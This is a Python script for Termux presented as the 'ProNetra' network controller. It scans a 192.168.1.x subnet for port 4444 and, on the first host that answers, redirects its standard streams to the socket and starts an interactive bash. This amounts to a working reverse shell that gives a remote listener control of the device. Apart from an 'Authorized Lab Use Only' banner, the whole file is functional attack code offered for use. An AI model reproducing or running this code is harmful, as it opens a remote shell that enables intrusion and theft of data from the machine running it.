#!/data/data/com.termux/files/usr/bin/python3

import socket
import os
import subprocess
import sys
import time

# ================= SETTINGS =================
PORT = 4444
BASE = "192.168.1."
START = 1
END   = 254
# =============================================

def banner():
    print(r"""
\033[1;32m
██████╗ ██████╗  ██████╗ ███╗   ██╗███████╗████████╗██████╗  █████╗ 
██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
██████╔╝██████╔╝██║   ██║██╔██╗ ██║█████╗     ██║   ██████╔╝███████║
██╔═══╝ ██╔══██╗██║   ██║██║╚██╗██║██╔══╝     ██║   ██╔══██╗██╔══██║
██║     ██║  ██║╚██████╔╝██║ ╚████║███████╗   ██║   ██║  ██║██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝

        ⚡ ProNetra – Network Controller Interface ⚡

════════════════════════════════════════════════════════════
>> SYSTEM: ProNetra Controller Mode Activated
>> AUTHOR: SHIVAM_PRO
>> VERSION: v2.0 (Controller Build)
>> ENV: Termux / Linux

════════════════════════════════════════════════════════════
>> STATUS: READY ✔
>> SCAN → CONNECT → INTERACT
>> SOCKET ENGINE ACTIVE

════════════════════════════════════════════════════════════
WARNING: Authorized Lab Use Only
NOTE: Unauthorized access is prohibited

════════════════════════════════════════════════════════════
>> Initializing Network Vision...
>> Awaiting Target Response...
============================================================
""")

def try_connect(ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.6)
        s.connect((ip, PORT))
        
        print(f"\033[1;32m[+] CONNECTED SUCCESSFULLY → {ip}:{PORT}\033[0m")
        print(f"\033[1;33m[!] Starting interactive shell now...\033[0m")
        
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        subprocess.call(["/data/data/com.termux/files/usr/bin/bash", "-i"])
        return True
    except:
        return False
    finally:
        try:
            s.close()
        except:
            pass

def main():
    banner()
    
    print(f"\033[1;36m[*] Starting port {PORT} scan on {BASE}{START}-{END} ...\033[0m")
    print(f"\033[1;35m[Total hosts to check: {END-START+1}]\033[0m\n")
    
    connected = False
    
    for i in range(START, END+1):
        ip = BASE + str(i)
        sys.stdout.write(f"\r\033[K\033[1;33m[Scanning] {ip:15}   \033[0m")
        sys.stdout.flush()
        
        if try_connect(ip):
            connected = True
            break
        
        time.sleep(0.15)  
    
    if not connected:
        print(f"\n\033[1;31m[-] No host found with port {PORT} open\033[0m")
    else:
        print(f"\n\033[1;32m[✓] Connection established and shell started!\033[0m")

if __name__ == "__main__":
    main()
